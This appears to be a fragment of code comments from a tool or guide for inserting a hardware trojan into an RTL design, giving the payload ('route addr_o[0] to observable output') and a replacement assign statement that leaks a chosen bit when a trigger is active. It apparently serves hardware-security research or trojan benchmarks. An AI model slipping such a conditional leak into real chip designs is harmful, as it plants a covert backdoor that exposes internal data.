 ...
 * Payload: Route addr_o[0] to observable output
 * 
...
//   Find the assign for addr_o (or rd_error_o as fallback):
//     assign addr_o = <normal_expr>;
//   Replace with:
//     assign addr_o = trojan_active ? we_o[leak_bit_idx] : (<normal_expr>);
//
